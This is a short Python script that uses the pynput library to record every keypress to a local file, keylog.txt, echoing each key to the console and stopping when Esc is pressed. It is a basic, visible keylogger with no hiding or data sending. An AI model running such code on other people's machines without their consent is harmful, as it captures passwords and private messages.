from pynput import keyboard

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
        log_file.write('{0}\n'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))
        log_file.write('{0}\n'.format(key))

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
log_file = open('keylog.txt', 'w')
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
